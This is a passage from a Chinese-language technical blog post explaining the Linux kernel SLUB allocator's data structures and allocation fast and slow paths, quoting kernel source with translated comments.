<span class="hljs-title">kobject</span> <span class="hljs-title">kobj</span>;</span><span class="hljs-comment">/* For sysfs */</span><br><span class="hljs-meta">#<span class="hljs-keyword">endif</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">ifdef</span> CONFIG_SLAB_FREELIST_HARDENED</span><br><span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> random;<br><span class="hljs-meta">#<span class="hljs-keyword">endif</span></span><br><br><span class="hljs-meta">#<span class="hljs-keyword">ifdef</span> CONFIG_NUMA</span><br><span class="hljs-comment">/*</span><br><span class="hljs-comment"> * Defragmentation by allocating from a remote node.</span><br><span class="hljs-comment"> */</span><br><span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> remote_node_defrag_ratio;<br><span class="hljs-meta">#<span class="hljs-keyword">endif</span></span><br><br><span class="hljs-meta">#<span class="hljs-keyword">ifdef</span> CONFIG_SLAB_FREELIST_RANDOM</span><br><span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> *random_seq;<br><span class="hljs-meta">#<span class="hljs-keyword">endif</span></span><br><br><span class="hljs-meta">#<span class="hljs-keyword">ifdef</span> CONFIG_KASAN_GENERIC</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">kasan_cache</span> <span class="hljs-title">kasan_info</span>;</span><br><span class="hljs-meta">#<span class="hljs-keyword">endif</span></span><br><br><span class="hljs-meta">#<span class="hljs-keyword">ifdef</span> CONFIG_HARDENED_USERCOPY</span><br><span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> useroffset;<span class="hljs-comment">/* Usercopy region offset */</span><br><span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> usersize;<span class="hljs-comment">/* Usercopy region size */</span><br><span class="hljs-meta">#<span class="hljs-keyword">endif</span></span><br><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">kmem_cache_node</span> *<span class="hljs-title">node</span>[<span class="hljs-title">MAX_NUMNODES</span>];</span><br>&#125;;<br></code></pre></td></tr></table></figure><p>其中最主要的两个字段如下：</p><h4 id="struct-kmem-cache-cpu"><a href="#struct-kmem-cache-cpu" class="headerlink" title="struct kmem_cache_cpu"></a>struct kmem_cache_cpu</h4><ul><li><code>cpu_cache</code>: 类型为<code>kmem_cache_cpu</code>指针，一个cpu的空闲对象缓存，其大致定义如下:</li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/*</span><br><span class="hljs-comment"> * 更改布局时，请确保 freelist 和 tid 仍然符合 this_cpu_cmpxchg_double() 对齐要求</span><br><span class="hljs-comment"> */</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">kmem_cache_cpu</span> &#123;</span><br><span class="hljs-type">void</span> **freelist;<span class="hljs-comment">/* 指向下一个空闲object的指针的指针 */</span><br><span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> tid;<span class="hljs-comment">/* 全局唯一的事务id */</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">slab</span> *<span class="hljs-title">slab</span>;</span><span class="hljs-comment">/* 我们分配到的slab */</span><br><span class="hljs-meta">#<span class="hljs-keyword">ifdef</span> CONFIG_SLUB_CPU_PARTIAL</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">slab</span> *<span class="hljs-title">partial</span>;</span><span class="hljs-comment">/* Partially allocated frozen slabs */</span><br><span class="hljs-meta">#<span class="hljs-keyword">endif</span></span><br><span class="hljs-type">local_lock_t</span> lock;<span class="hljs-comment">/* Protects the fields above */</span><br><span class="hljs-meta">#<span class="hljs-keyword">ifdef</span> CONFIG_SLUB_STATS</span><br><span class="hljs-type">unsigned</span> stat[NR_SLUB_STAT_ITEMS];<br><span class="hljs-meta">#<span class="hljs-keyword">endif</span></span><br>&#125;;<br></code></pre></td></tr></table></figure><p>其中有下面几点需要注意：</p><ol><li>freelist：指向下一个分配对象的指针</li><li>slab：被当前使用来分配内存的slab</li><li>partial：链表上为仍有一定空闲object的slab</li></ol><p>其中<code>slab-&gt;freelist</code>在被<code>kmem_cache_cpu</code>使用时为NULL，是个无效值，只有他在处于partial链表才会有效</p><h4 id="struct-kmem-cache-node"><a href="#struct-kmem-cache-node" class="headerlink" title="struct kmem_cache_node"></a>struct kmem_cache_node</h4><ul><li><code>node[MAX_NUMNODES]</code>:他是一个数组指针，其中每一个元素都指向一个<code>kmem_cache_node</code>，他是NUMA架构中每个node节点的缓存，如下：</li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/*</span><br><span class="hljs-comment"> * The slab lists for all objects.</span><br><span class="hljs-comment"> */</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">kmem_cache_node</span> &#123;</span><br><span class="hljs-meta">#<span class="hljs-keyword">ifdef</span> CONFIG_SLAB</span><br>...<br>    <span class="hljs-comment">/* for slab method */</span><br>...<br><span class="hljs-meta">#<span class="hljs-keyword">endif</span></span><br><br><span class="hljs-meta">#<span class="hljs-keyword">ifdef</span> CONFIG_SLUB</span><br><span class="hljs-type">spinlock_t</span> list_lock; <span class="hljs-comment">//列表自旋锁</span><br><span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> nr_partial; <span class="hljs-comment">//半满slab的个数</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">list_head</span> <span class="hljs-title">partial</span>;</span> <span class="hljs-comment">//半满slab的头</span><br><span class="hljs-meta">#<span class="hljs-keyword">ifdef</span> CONFIG_SLUB_DEBUG</span><br><span class="hljs-type">atomic_long_t</span> nr_slabs; <span class="hljs-comment">//所有slab数量</span><br><span class="hljs-type">atomic_long_t</span> total_objects; <span class="hljs-comment">//总共的object数量</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">list_head</span> <span class="hljs-title">full</span>;</span> <span class="hljs-comment">//满slab的头</span><br><span class="hljs-meta">#<span class="hljs-keyword">endif</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">endif</span></span><br><br>&#125;;<br></code></pre></td></tr></table></figure><p>我们在初始化分配器的时候，会定义一个全局变量<code>kmalloc_caches</code>，如下：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">kmem_cache</span> *<span class="hljs-title">kmalloc_caches</span>[<span class="hljs-title">NR_KMALLOC_TYPES</span>][<span class="hljs-title">KMALLOC_SHIFT_HIGH</span> + 1] __<span class="hljs-title">ro_after_init</span> =</span><br>&#123; <span class="hljs-comment">/* initialization for https://bugs.llvm.org/show_bug.cgi?id=42570 */</span> &#125;;<br>EXPORT_SYMBOL(kmalloc_caches);<br></code></pre></td></tr></table></figure><p>其中他的行为以下枚举类型</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/*</span><br><span class="hljs-comment"> * Whenever changing this, take care of that kmalloc_type() and</span><br><span class="hljs-comment"> * create_kmalloc_caches() still work as intended.</span><br><span class="hljs-comment"> *</span><br><span class="hljs-comment"> * KMALLOC_NORMAL can contain only unaccounted objects whereas KMALLOC_CGROUP</span><br><span class="hljs-comment"> * is for accounted but unreclaimable and non-dma objects. All the other</span><br><span class="hljs-comment"> * kmem caches can have both accounted and unaccounted objects.</span><br><span class="hljs-comment"> */</span><br><span class="hljs-class"><span class="hljs-keyword">enum</span> <span class="hljs-title">kmalloc_cache_type</span> &#123;</span><br>KMALLOC_NORMAL = <span class="hljs-number">0</span>,<br><span class="hljs-meta">#<span class="hljs-keyword">ifndef</span> CONFIG_ZONE_DMA</span><br>KMALLOC_DMA = KMALLOC_NORMAL,<br><span class="hljs-meta">#<span class="hljs-keyword">endif</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">ifndef</span> CONFIG_MEMCG_KMEM</span><br>KMALLOC_CGROUP = KMALLOC_NORMAL,<br><span class="hljs-meta">#<span class="hljs-keyword">endif</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">ifdef</span> CONFIG_SLUB_TINY</span><br>KMALLOC_RECLAIM = KMALLOC_NORMAL,<br><span class="hljs-meta">#<span class="hljs-keyword">else</span></span><br>KMALLOC_RECLAIM,<br><span class="hljs-meta">#<span class="hljs-keyword">endif</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">ifdef</span> CONFIG_ZONE_DMA</span><br>KMALLOC_DMA,<br><span class="hljs-meta">#<span class="hljs-keyword">endif</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">ifdef</span> CONFIG_MEMCG_KMEM</span><br>KMALLOC_CGROUP,<br><span class="hljs-meta">#<span class="hljs-keyword">endif</span></span><br>NR_KMALLOC_TYPES<br>&#125;;<br></code></pre></td></tr></table></figure><p>他的值主要靠编译时期的配置来决定管理不同内存段的slab，例如64位的<code>dma</code>,<code>normal</code>等等。</p><p>然后我们的列主要是以下部分</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">define</span> KMALLOC_SHIFT_HIGH(PAGE_SHIFT + 1)</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> PAGE_SHIFT12</span><br></code></pre></td></tr></table></figure><p>所以说我们的<code>kmalloc_caches</code>共有14列，行数需通过配置来决定</p><p>下面我们来完善上面的图</p><p><img src="http://imgsrc.baidu.com/forum/pic/item/f703738da97739121615ad51be198618367ae2cb.jpg"></p><h2 id="2-分配过程"><a href="#2-分配过程" class="headerlink" title="2.分配过程"></a>2.分配过程</h2><p>首先我们拿<code>__kmalloc</code>函数来分析，他的实现如下，调用另一个函数<code>__do_kmalloc_node</code></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">void</span> *__kmalloc(<span class="hljs-type">size_t</span> size, <span class="hljs-type">gfp_t</span> flags)<br>&#123;<br><span class="hljs-keyword">return</span> __do_kmalloc_node(size, flags, NUMA_NO_NODE, _RET_IP_);<br>&#125;<br></code></pre></td></tr></table></figure><p>之后该函数又调用其他函数,<del>我超上面白写了</del>，调用链如下：</p><figure class="highlight sqf"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs sqf"><span class="hljs-variable">__kmalloc</span><br><span class="hljs-variable">__do_kmalloc_node</span> <span class="hljs-comment">//在这一部分会通过传递的标志和大小来从kmalloc_caches数组中传入合适的kmem_cache数据结构</span><br><span class="hljs-variable">__kmem_cache_alloc_node</span><br>slab_alloc_node<br><span class="hljs-variable">__slab_alloc_node</span> <span class="hljs-comment">//若cpu_slab-&gt;freelist非空，则直接分配，到这里停止</span><br><span class="hljs-variable">__slab_alloc</span><br><span class="hljs-variable">___slab_alloc</span><br></code></pre></td></tr></table></figure><p>下面我们来首先分析<code>slab_alloc_node</code>函数，如下：</p><h3 id="slab-alloc-node"><a href="#slab-alloc-node" class="headerlink" title="slab_alloc_node"></a>slab_alloc_node</h3><p>一切尽在注释中:happy:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/*</span><br><span class="hljs-comment"> * 内联快速路径，以便分配函数（kmalloc、kmem_cache_alloc）将快速路径折叠到其函数中。</span><br><span class="hljs-comment"> * 因此，对于可以在快速路径上满足的请求，没有函数调用开销</span><br><span class="hljs-comment"> * 快速路径的工作原理是首先检查是否可以使用无锁空闲列表。</span><br><span class="hljs-comment"> * 如果没有，则调用 __slab_alloc 来进行缓慢的处理。</span><br><span class="hljs-comment"> * 否则，我们可以简单地从无锁空闲列表中选择下一个对象</span><br><span class="hljs-comment"> */</span><br><span class="hljs-type">static</span> __fastpath_inline <span class="hljs-type">void</span> *<span class="hljs-title function_">slab_alloc_node</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> kmem_cache *s, <span class="hljs-keyword">struct</span> list_lru *lru,</span><br><span class="hljs-params"><span class="hljs-type">gfp_t</span> gfpflags, <span class="hljs-type">int</span> node, <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> addr, <span class="hljs-type">size_t</span> orig_size)</span><br>&#123;<br><span class="hljs-type">void</span> *object;<br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">obj_cgroup</span> *<span class="hljs-title">objcg</span> =</span> <span class="hljs-literal">NULL</span>;<br><span class="hljs-type">bool</span> init = <span class="hljs-literal">false</span>;<br><br>s = slab_pre_alloc_hook(s, lru, &amp;objcg, <span class="hljs-number">1</span>, gfpflags);<br><span class="hljs-keyword">if</span> (!s)<br><span class="hljs-keyword">return</span> <span class="hljs-literal">NULL</span>;<br><span class="hljs-comment">/**</span><br><span class="hljs-comment"> * kfence_alloc() - allocate a KFENCE object with a low probability</span><br><span class="hljs-comment"> * @s:     struct kmem_cache with object requirements</span><br><span class="hljs-comment"> * @size:  exact size of the object to allocate (can be less than @s-&gt;size</span><br><span class="hljs-comment"> *         e.g. for kmalloc caches)</span><br><span class="hljs-comment"> * @flags: GFP flags</span><br><span class="hljs-comment"> *</span><br><span class="hljs-comment"> * Return:</span><br><span class="hljs-comment"> * * NULL     - 若为空，则我们接着进行常规分配,</span><br><span class="hljs-comment"> * * non-NULL - 若不为空，则返回一个 KFENCE object.</span><br><span class="hljs-comment"> *</span><br><span class="hljs-comment"> * kfence_alloc() 应该插入到堆分配快速路径中，</span><br><span class="hljs-comment"> * 允许它使用静态分支以较低的概率透明地返回 KFENCE 分配的对象</span><br><span class="hljs-comment"> * （概率由 kfence.sample_interval 启动参数控制）.</span><br><span class="hljs-comment"> */</span><br>object = kfence_alloc(s, orig_size, gfpflags);<br><span class="hljs-keyword">if</span> (unlikely(object))<br><span class="hljs-keyword">goto</span> out;<br><br>object = __slab_alloc_node(s, gfpflags, node, addr, orig_size);<br><br><span class="hljs-comment">/*</span><br><span class="hljs-comment"> * If the object has been wiped upon free, 确保object的freelist指针被清0来充分初始化.</span><br><span class="hljs-comment"> */</span><br>maybe_wipe_obj_freeptr(s, object);<br>init = slab_want_init_on_alloc(gfpflags, s);<br><br>out:<br><span class="hljs-comment">/*</span><br><span class="hljs-comment"> * When init equals &#x27;true&#x27;, like for kzalloc() family, only</span><br><span class="hljs-comment"> * @orig_size bytes might be zeroed instead of s-&gt;object_size</span><br><span class="hljs-comment"> */</span><br>slab_post_alloc_hook(s, objcg, gfpflags, <span class="hljs-number">1</span>, &amp;object, init, orig_size);<br><br><span class="hljs-keyword">return</span> object;<br>&#125;<br><br></code></pre></td></tr></table></figure><p>上面注释可以看到，首先会调用<code>kfence_alloc</code>进行检测，若通过则进如核心分配函数，否则直接转到<code>out</code>，接着转到我们的核心函数<code>__slab_alloc_node</code>,通过他获取object的之后，再调用<code>maybe_wipe_obj_freeptr</code>,他把所获得的object的freelist指针清空来进行初始化，然后调用<code>slab_want_init_on_alloc</code>函数，他通过判断标志位是否含有<code>__GFP_ZERO</code>来进行赋0值的清空操作。</p><h3 id="slab-alloc-node-1"><a href="#slab-alloc-node-1" class="headerlink" title="__slab_alloc_node"></a>__slab_alloc_node</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">static</span> __always_inline <span class="hljs-type">void</span> *__slab_alloc_node(<span class="hljs-keyword">struct</span> kmem_cache *s,<br><span class="hljs-type">gfp_t</span> gfpflags, <span class="hljs-type">int</span> node, <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> addr, <span class="hljs-type">size_t</span> orig_size)<br>&#123;<br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">kmem_cache_cpu</span> *<span class="hljs-title">c</span>;</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">slab</span> *<span class="hljs-title">slab</span>;</span><br><span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> tid;<br><span class="hljs-type">void</span> *object;<br><br>redo:<br><span class="hljs-comment">/*</span><br><span class="hljs-comment"> * 必须通过此 cpu ptr 读取 kmem_cache cpu 数据。 </span><br><span class="hljs-comment"> * 抢占已启用。 当从一个 cpu 区域读取数据时，我们可能会在 cpu 之间来回切换。</span><br><span class="hljs-comment">     * 只要我们在执行 cmpxchg 时再次使用原始 cpu，这并不重要。</span><br><span class="hljs-comment"> *</span><br><span class="hljs-comment"> * 我们必须保证 tid 和 kmem_cache_cpu 在同一个 cpu 上检索。 </span><br><span class="hljs-comment"> * 我们首先读取 kmem_cache_cpu 指针并用它来读取 tid。 </span><br><span class="hljs-comment"> * 如果我们在两次读取之间被抢占并切换到另一个 cpu，也没关系，因为两者仍然与同一个 cpu 关联，</span><br><span class="hljs-comment"> * 并且 cmpxchg 稍后将验证该 cpu</span><br><span class="hljs-comment"> */</span><br>c = raw_cpu_ptr(s-&gt;cpu_slab);<br>tid = READ_ONCE(c-&gt;tid);<br><br><span class="hljs-comment">/*</span><br><span class="hljs-comment"> * 这里使用的 Irqless 对象分配/释放算法取决于获取 cpu_slab 数据的顺序。</span><br><span class="hljs-comment">     * tid 应该在 c 上的任何内容之前获取，以保证与先前 tid 关联的对象和平板不会与当前 tid 一起使用。</span><br><span class="hljs-comment">     * 如果我们先获取 tid，则对象和平板可能会与下一个 tid 关联，并且我们的分配/释放请求将失败。</span><br><span class="hljs-comment">     * 在这种情况下，我们将重试。 所以，没问题。</span><br><span class="hljs-comment"> */</span><br>barrier();<br><br><span class="hljs-comment">/*</span><br><span class="hljs-comment"> * 每个 cpu 以及每个 cpu 队列上的每个操作的事务 ID 都是全局唯一的。</span><br><span class="hljs-comment">     * 因此，他们可以保证 cmpxchg_double 发生在正确的处理器上，并且其间没有对链表进行任何操作。</span><br><span class="hljs-comment"> */</span><br><br>object = c-&gt;freelist;<br>slab = c-&gt;slab;<br><br><span class="hljs-keyword">if</span> (!USE_LOCKLESS_FAST_PATH() ||<br>    unlikely(!object || !slab || !node_match(slab, node))) &#123; <span class="hljs-comment">//如果object和slab为空或者slab与node不匹配</span><br>object = __slab_alloc(s, gfpflags, node, addr, c, orig_size); <span class="hljs-comment">//分配新slab然后获取其中的object</span><br>&#125; <span class="hljs-keyword">else</span> &#123;<br><span class="hljs-type">void</span> *next_object = get_freepointer_safe(s, object); <span class="hljs-comment">//得到当前object连接的下一个free object</span><br><br><span class="hljs-comment">/*</span><br><span class="hljs-comment"> * 仅当没有其他操作并且我们使用正确的处理器时，cmpxchg 才会匹配。</span><br><span class="hljs-comment">          * cmpxchg 以原子方式执行以下操作（没有锁语义！） </span><br><span class="hljs-comment">          * 1. 将第一个指针重新定位到当前每个 cpu 区域。 </span><br><span class="hljs-comment">          * 2. 验证 tid 和 freelist 是否未更改 </span><br><span class="hljs-comment">          * 3. 如果未更改，则替换 tid 和 freelist 由于这没有锁定语义，</span><br><span class="hljs-comment">          * 因此只能防止在该 cpu 上执行的代码，s而不能防止其他 cpu 的访问。</span><br><span class="hljs-comment"> */</span><br><span class="hljs-keyword">if</span> (unlikely(!this_cpu_cmpxchg_double(<br>s-&gt;cpu_slab-&gt;freelist, s-&gt;cpu_slab-&gt;tid,<br>object, tid,<br>next_object, next_tid(tid)))) &#123;<br><br>note_cmpxchg_failure(<span class="hljs-string">&quot;slab_alloc&quot;</span>, s, tid);  <span class="hljs-comment">//若发生了改变，则证明我们现在换了个cpu运行，因此重新在当前cpu分配object</span><br><span class="hljs-keyword">goto</span> redo;<br>&#125;<br>prefetch_freepointer(s, next_object); <span class="hljs-comment">//若没改变，则设置freepointer指向分配object的下一个object</span><br>stat(s, ALLOC_FASTPATH);<br>&#125;<br><br><span class="hljs-keyword">return</span> object;<br>&#125;<br></code></pre></td></tr></table></figure><p>该函数若是在较为理想的情况下会直接从<code>cpu_slab</code>的<code>freelist</code>进行分配,否则会通过<code>__slab_alloc</code>分配新的slab</p><h3 id="slab-alloc"><a href="#slab-alloc" class="headerlink" title="__slab_alloc"></a>__slab_alloc</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/*</span><br><span class="hljs-comment"> * ___slab_alloc() 的包装器，适用于尚未禁用抢占的上下文。 </span><br><span class="hljs-comment"> * 通过重新获取每个 cpu 区域指针来补偿可能的 cpu 变化。</span><br><span class="hljs-comment"> */</span><br><span class="hljs-type">static</span> <span class="hljs-type">void</span> *__slab_alloc(<span class="hljs-keyword">struct</span> kmem_cache *s, <span class="hljs-type">gfp_t</span> gfpflags, <span class="hljs-type">int</span> node,<br>  <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> addr, <span class="hljs-keyword">struct</span> kmem_cache_cpu *c, <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> orig_size)<br>&#123;<br><span class="hljs-type">void</span> *p;<br><br><span class="hljs-meta">#<span class="hljs-keyword">ifdef</span> CONFIG_PREEMPT_COUNT</span><br><span class="hljs-comment">/*</span><br><span class="hljs-comment"> * 在禁用抢占之前，我们可能已经被抢占并重新调度到不同的 cpu 上。</span><br><span class="hljs-comment">     * 需要重新加载cpu区域指针。</span><br><span class="hljs-comment"> */</span><br>c = slub_get_cpu_ptr(s-&gt;cpu_slab);<br><span class="hljs-meta">#<span class="hljs-keyword">endif</span></span><br><br>p = ___slab_alloc(s, gfpflags, node, addr, c, orig_size);<br><span class="hljs-meta">#<span class="hljs-keyword">ifdef</span> CONFIG_PREEMPT_COUNT</span><br>slub_put_cpu_ptr(s-&gt;cpu_slab);<br><span class="hljs-meta">#<span class="hljs-keyword">endif</span></span><br><span class="hljs-keyword">return</span> p;<br>&#125;<br></code></pre></td></tr></table></figure><p>上面函数也没干啥，就是重新获取cpu_slab用来防止cpu切换，这里调用<code>___slab_alloc</code></p><h3 id="slab-alloc-1"><a href="#slab-alloc-1" class="headerlink" title="___slab_alloc"></a>___slab_alloc</h3><p>接下来就是咱们的重磅函数，如下：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/*</span><br><span class="hljs-comment"> * 慢路径. 无锁空闲列表为空或者我们需要执行调试职责.</span><br><span class="hljs-comment"> *</span><br><span class="hljs-comment"> * 如果新对象已释放到常规空闲列表，处理速度仍然非常快。</span><br><span class="hljs-comment"> * 在这种情况下，我们只需将常规空闲列表接管为无锁空闲列表，然后取消常规空闲列表。</span><br><span class="hljs-comment"> *</span><br><span class="hljs-comment"> * 如果这不起作用，那么我们就回到partial列表。</span><br><span class="hljs-comment"> * 我们将空闲列表的第一个元素作为现在要分配的对象，并将空闲列表的其余部分移动到无锁空闲列表。</span><br><span class="hljs-comment"> *</span><br><span class="hljs-comment"> * 如果我们无法从部分slab列表中获取新的slab，那么我们需要分配一个新的slab。 </span><br><span class="hljs-comment"> * 这是最慢的路径，因为它涉及对页面分配器的调用和新slab的设置。</span><br><span class="hljs-comment"> *</span><br><span class="hljs-comment"> * 当我们知道抢占已被禁用时要使用的 __slab_alloc 版本（批量分配就是这种情况）。</span><br><span class="hljs-comment"> */</span><br><span class="hljs-type">static</span> <span class="hljs-type">void</span> *___slab_alloc(<span class="hljs-keyword">struct</span> kmem_cache *s, <span class="hljs-type">gfp_t</span> gfpflags, <span class="hljs-type">int</span> node,<br>  <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> addr, <span class="hljs-keyword">struct</span> kmem_cache_cpu *c, <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> orig_size)<br>&#123;<br><span class="hljs-type">void</span> *freelist;<br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">slab</span> *<span class="hljs-title">slab</span>;</span><br><span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> flags;<br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">partial_context</span> <span class="hljs-title">pc</span>;</span><br><br>stat(s, ALLOC_SLOWPATH);<br><br>...<br>        <br>&#125;<br></code></pre></td></tr></table></figure><p>下面我们将一步一步解析该部分源码，内核设计他时刚好自行将其分了块，我们就根据这些块来讲解：</p><h4 id="one-reread-slab"><a href="#one-reread-slab" class="headerlink" title=":one: reread_slab"></a>:one: 